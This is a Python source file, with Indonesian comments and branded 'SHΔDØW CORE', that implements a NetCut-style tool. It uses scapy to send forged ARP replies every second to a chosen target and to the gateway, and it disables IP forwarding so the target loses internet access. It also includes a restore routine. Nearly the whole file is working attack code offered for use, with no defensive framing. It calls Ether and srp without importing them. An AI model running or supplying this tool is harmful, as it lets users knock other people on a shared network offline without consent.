# [file name]: netcut_engine.py
# [file content begin]
"""
SHΔDØW CORE NETCUT ENGINE
ARP Spoofing dengan kemampuan memutuskan koneksi internet seperti NetCut
Tanpa packet forwarding = internet terputus total
"""

import threading
import time
import socket
import subprocess
import netifaces
import os
import json
from datetime import datetime
import logging
from scapy.all import ARP, send, get_if_hwaddr

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class NetCutEngine:
    def __init__(self):
        self.interface = self._detect_interface()
        self.local_ip = self._get_local_ip()
        self.local_mac = get_if_hwaddr(self.interface)
        self.gateway_ip = None
        self.gateway_mac = None
        self.cut_targets = {}  # {target_ip: {'mac': xx, 'thread': obj}}
        self.running = False
        self.config_file = "netcut_config.json"
        
        self._discover_gateway()
        logger.info(f"NetCut Engine initialized on {self.interface}")
    
    def _detect_interface(self):
        """Detect active network interface"""
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET]
            return default_gateway[1]
        except:
            return "eth0"
    
    def _get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _discover_gateway(self):
        """Discover gateway IP and MAC"""
        try:
            gateways = netifaces.gateways()
            self.gateway_ip = gateways['default'][netifaces.AF_INET][0]
            
            # Get gateway MAC via ARP
            self.gateway_mac = self._get_mac(self.gateway_ip)
            logger.info(f"Gateway: {self.gateway_ip} -> {self.gateway_mac}")
        except Exception as e:
            logger.error(f"Gateway discovery failed: {e}")
    
    def _get_mac(self, ip):
        """Get MAC address from ARP table"""
        try:
            if os.name == 'posix':  # Linux/Mac
                cmd = f"arp -n {ip} | grep -v Address | awk '{{print $3}}'"
                result = subprocess.check_output(cmd, shell=True).decode().strip()
                if result and result != '(incomplete)':
                    return result
            elif os.name == 'nt':  # Windows
                cmd = f"arp -a {ip}"
                result = subprocess.check_output(cmd, shell=True).decode()
                for line in result.splitlines():
                    if ip in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            return parts[1].replace('-', ':')
        except:
            pass
        
        # Fallback using scapy
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            if answered_list:
                return answered_list[0][1].hwsrc
        except:
            pass
        
        return None
    
    def cut_internet(self, target_ip):
        """
        Potong internet target dengan ARP spoofing
        Tanpa packet forwarding = internet mati total
        """
        if target_ip in self.cut_targets:
            logger.info(f"Internet already cut for {target_ip}")
            return True
        
        # Get target MAC
        target_mac = self._get_mac(target_ip)
        if not target_mac:
            logger.error(f"Failed to get MAC for {target_ip}")
            return False
        
        # Start cutting thread
        cut_thread = threading.Thread(
            target=self._cut_thread,
            args=(target_ip, target_mac),
            daemon=True
        )
        
        self.cut_targets[target_ip] = {
            'mac': target_mac,
            'thread': cut_thread,
            'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'status': 'cutting'
        }
        
        # Disable IP forwarding (kunci untuk memutus internet)
        self._disable_ip_forwarding()
        
        cut_thread.start()
        logger.info(f"Internet cut started for {target_ip}")
        return True
    
    def _cut_thread(self, target_ip, target_mac):
        """Thread untuk mengirim ARP poison terus menerus"""
        while target_ip in self.cut_targets and self.cut_targets[target_ip]['status'] == 'cutting':
            try:
                # Poison 1: Tell target we are the gateway (TANPA forwarding)
                poison_to_target = ARP(
                    op=2,  # ARP reply
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.local_mac
                )
                
                # Poison 2: Tell gateway we are the target (TANPA forwarding)
                poison_to_gateway = ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=target_ip,
                    hwsrc=self.local_mac
                )
                
                # Send poisoned packets
                send(poison_to_target, verbose=False)
                send(poison_to_gateway, verbose=False)
                
                time.sleep(1)  # Kirim setiap 1 detik
                
            except Exception as e:
                logger.error(f"Error in cut thread for {target_ip}: {e}")
                time.sleep(5)
    
    def restore_internet(self, target_ip=None):
        """
        Restore internet connection untuk target
        Kirim ARP reply yang benar untuk restore jaringan
        """
        if target_ip:
            if target_ip in self.cut_targets:
                self._send_restore_packets(target_ip)
                del self.cut_targets[target_ip]
                logger.info(f"Internet restored for {target_ip}")
                return True
        else:
            # Restore semua target
            for ip in list(self.cut_targets.keys()):
                self._send_restore_packets(ip)
            self.cut_targets.clear()
            logger.info("All internet connections restored")
            return True
        
        return False
    
    def _send_restore_packets(self, target_ip):
        """Kirim ARP packet yang benar untuk restore jaringan"""
        try:
            target_info = self.cut_targets[target_ip]
            target_mac = target_info['mac']
            
            # Restore target ARP table: gateway is really gateway
            restore_to_target = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac
            )
            
            # Restore gateway ARP table: target is really target
            restore_to_gateway = ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=target_ip,
                hwsrc=target_mac
            )
            
            # Send restore packets 10 times untuk memastikan
            for _ in range(10):
                send(restore_to_target, verbose=False)
                send(restore_to_gateway, verbose=False)
                time.sleep(0.1)
                
        except Exception as e:
            logger.error(f"Error restoring {target_ip}: {e}")
    
    def _disable_ip_forwarding(self):
        """Pastikan IP forwarding dimatikan agar traffic tidak diteruskan"""
        try:
            if os.name == 'posix':
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                             capture_output=True, text=True)
            elif os.name == 'nt':
                subprocess.run(
                    ['reg', 'add', 'HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
                     '/v', 'IPEnableRouter', '/t', 'REG_DWORD', '/d', '0', '/f'],
                    capture_output=True, text=True
                )
        except Exception as e:
            logger.error(f"Error disabling IP forwarding: {e}")
    
    def get_status(self):
        """Get current NetCut status"""
        active_cuts = list(self.cut_targets.keys())
        
        return {
            'engine_active': len(active_cuts) > 0,
            'interface': self.interface,
            'gateway_ip': self.gateway_ip,
            'gateway_mac': self.gateway_mac,
            'active_cuts': active_cuts,
            'total_cuts': len(active_cuts),
            'cut_targets': [
                {
                    'ip': ip,
                    'mac': info['mac'],
                    'start_time': info['start_time']
                }
                for ip, info in self.cut_targets.items()
            ]
        }
    
    def cleanup(self):
        """Cleanup semua cuts saat aplikasi berhenti"""
        self.restore_internet()  # Restore semua
        logger.info("NetCut Engine cleaned up")
# [file content end]